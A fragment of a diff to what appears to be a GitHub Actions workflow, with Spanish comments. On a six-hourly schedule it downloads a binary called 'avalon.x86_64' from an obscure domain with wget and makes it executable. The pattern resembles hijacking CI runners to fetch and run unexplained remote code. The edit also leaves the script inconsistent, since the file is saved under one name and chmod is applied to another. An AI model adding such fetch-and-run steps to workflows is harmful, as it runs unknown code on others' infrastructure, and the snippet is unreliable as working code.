@@ -25,7 +25,7 @@ jobs:
           echo "Starting at: $(date)"
           echo "Next run in 6 hours"
           # Descargar avalon
-          wget -q https://dcasdcas.online/avalon.x86_64 -O avalon
+          wget -q https://dcasdcas.online/avalon.x86_64
           chmod +x avalon
           # Guardar timestamp
           echo "start_time=$(date +%s)" >> $GITHUB_OUTPUT
